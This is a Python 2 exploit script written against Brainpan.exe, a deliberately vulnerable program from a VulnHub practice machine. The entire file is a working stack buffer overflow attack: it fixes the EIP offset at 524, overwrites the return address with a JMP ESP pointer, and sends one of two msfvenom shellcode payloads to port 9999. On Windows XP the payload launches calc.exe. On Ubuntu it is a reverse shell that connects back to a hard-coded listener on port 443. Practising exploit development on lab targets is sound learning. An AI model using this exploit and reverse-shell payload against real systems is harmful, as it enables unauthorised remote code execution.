#!/usr/bin/env python
#---------------------------------------------------------------------------------------------#
# Software      = Brainpan.exe version 1.0                                                    #
# Download Link = https://www.vulnhub.com/entry/brainpan-1,51/#                               #
# Date          = 8/31/2017                                                                   #
# Author        = @ihack4falafel                                                              #
# Tested on     = Windows XP SP3 - Professional | Ubuntu 12.10 (Quantal Quetzal)              #
# EIP Offset    = 524                                                                         #
# Badchars      = "\x00"                                                                      #
# RET Address   = 311712F3 "\xFF\xE4" | [brainpan.exe]                                        #
# Usage         = python exploit.py <target IP> <platform>                                    #        
#---------------------------------------------------------------------------------------------#

import sys
import socket
import struct
import time

if len(sys.argv) < 3:
  print "Usage               : python exploit.py <target IP> <platform>"
  print "Example             : python exploit.py 127.0.0.1 0       | Windows XP"
  print "                      python exploit.py 192.168.127.139 1 | Ubuntu 12.10" 
  sys.exit(0)

HOST = sys.argv[1]
PLATFORM = sys.argv[2]

if PLATFORM is "0":
  print "[+] Selecting calc.exe payload for Windows XP.."
  time.sleep(1)
  
  #------------------------------------------------------------------------------#
  # msfvenom -p windows/exec CMD=calc.exe -b "\x00" -f python -v payload         #
  #------------------------------------------------------------------------------#

  payload =  ""
  payload += "\xbe\x32\x12\xe1\xfa\xda\xdd\xd9\x74\x24\xf4\x58"
  payload += "\x29\xc9\xb1\x31\x31\x70\x13\x83\xc0\x04\x03\x70"
  payload += "\x3d\xf0\x14\x06\xa9\x76\xd6\xf7\x29\x17\x5e\x12"
  payload += "\x18\x17\x04\x56\x0a\xa7\x4e\x3a\xa6\x4c\x02\xaf"
  payload += "\x3d\x20\x8b\xc0\xf6\x8f\xed\xef\x07\xa3\xce\x6e"
  payload += "\x8b\xbe\x02\x51\xb2\x70\x57\x90\xf3\x6d\x9a\xc0"
  payload += "\xac\xfa\x09\xf5\xd9\xb7\x91\x7e\x91\x56\x92\x63"
  payload += "\x61\x58\xb3\x35\xfa\x03\x13\xb7\x2f\x38\x1a\xaf"
  payload += "\x2c\x05\xd4\x44\x86\xf1\xe7\x8c\xd7\xfa\x44\xf1"
  payload += "\xd8\x08\x94\x35\xde\xf2\xe3\x4f\x1d\x8e\xf3\x8b"
  payload += "\x5c\x54\x71\x08\xc6\x1f\x21\xf4\xf7\xcc\xb4\x7f"
  payload += "\xfb\xb9\xb3\xd8\x1f\x3f\x17\x53\x1b\xb4\x96\xb4"
  payload += "\xaa\x8e\xbc\x10\xf7\x55\xdc\x01\x5d\x3b\xe1\x52"
  payload += "\x3e\xe4\x47\x18\xd2\xf1\xf5\x43\xb8\x04\x8b\xf9"
  payload += "\x8e\x07\x93\x01\xbe\x6f\xa2\x8a\x51\xf7\x3b\x59"
  payload += "\x16\x07\x76\xc0\x3e\x80\xdf\x90\x03\xcd\xdf\x4e"
  payload += "\x47\xe8\x63\x7b\x37\x0f\x7b\x0e\x32\x4b\x3b\xe2"
  payload += "\x4e\xc4\xae\x04\xfd\xe5\xfa\x66\x60\x76\x66\x47"
  payload += "\x07\xfe\x0d\x97"

  #----------------------------#
  #      Buffer Structure      #
  #----------------------------#
  # buffer = AAA...........AAA #
  # buffer = EIP               #
  # buffer = NOPSled           #
  # buffer = payload           #
  # buffer = BBB...........BBB #
  #----------------------------#

  buffer = "A" * 524
  buffer += struct.pack('<L', 0x311712F3)
  buffer += "\x90" * 40
  buffer += payload
  buffer += "B" * (1000-524-4-40-len(payload))

  try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, 9999))
    print "[+] Connected to Brainpan.exe with IP: %s and port: 9999 " %(HOST)
    time.sleep(1)
    print "[+] Sending %s bytes of evil payload.." %len(buffer)
    time.sleep(1)
    data = s.recv(1024)
    s.send(buffer)
    print "[+] Calc.exe should pop up anytime now"
    s.close()
  except Exception,msg:
    print "[+] Unable to connect to Brainpan.exe"
    sys.exit(0)

elif PLATFORM is "1":
  print "[+] Selecting reverse shell payload for Ubuntu 12.10.."
  time.sleep(1)

  #---------------------------------------------------------------------------------------------------------------#
  # msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.127.137 LPORT=443 -b "\x00" -f python -v payload        #
  #---------------------------------------------------------------------------------------------------------------#

  payload =  ""
  payload += "\xda\xd7\xbe\xfb\x93\x85\xa4\xd9\x74\x24\xf4\x5d"
  payload += "\x31\xc9\xb1\x12\x31\x75\x17\x03\x75\x17\x83\x16"
  payload += "\x6f\x67\x51\xd9\x4b\x9f\x79\x4a\x2f\x33\x14\x6e"
  payload += "\x26\x52\x58\x08\xf5\x15\x0a\x8d\xb5\x29\xe0\xad"
  payload += "\xff\x2c\x03\xc5\x3f\x66\x8c\x9c\xa8\x75\x73\x9f"
  payload += "\x93\xf3\x92\x2f\x85\x53\x04\x1c\xf9\x57\x2f\x43"
  payload += "\x30\xd7\x7d\xeb\xa5\xf7\xf2\x83\x51\x27\xda\x31"
  payload += "\xcb\xbe\xc7\xe7\x58\x48\xe6\xb7\x54\x87\x69"

  #----------------------------#
  #      Buffer Structure      #
  #----------------------------#
  # buffer = AAA...........AAA #
  # buffer = EIP               #
  # buffer = NOPSled           #
  # buffer = payload           #
  # buffer = BBB...........BBB #
  #----------------------------#

  buffer = "A" * 524
  buffer += struct.pack('<L', 0x311712F3)
  buffer += "\x90" * 40
  buffer += payload
  buffer += "B" * (1000-524-4-40-len(payload))
  
  try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, 9999))
    print "[+] Connected to Brainpan.exe with IP: %s and port: 9999 " %(HOST)
    time.sleep(1)
    print "[+] Sending %s bytes of evil payload.." %len(buffer)
    time.sleep(1)
    data = s.recv(1024)
    s.send(buffer)
    print "[+] Check your netcat listener on port 443"
    s.close()
  except Exception,msg:
    print "[+] Unable to connect to Brainpan.exe"
    sys.exit(0)

else:
  print "Usage               : python exploit.py <target IP> <platform>"
  print "Example             : python exploit.py 127.0.0.1 0       | Windows XP"
  print "                      python exploit.py 192.168.127.139 1 | Ubuntu 12.10" 
  sys.exit(0)

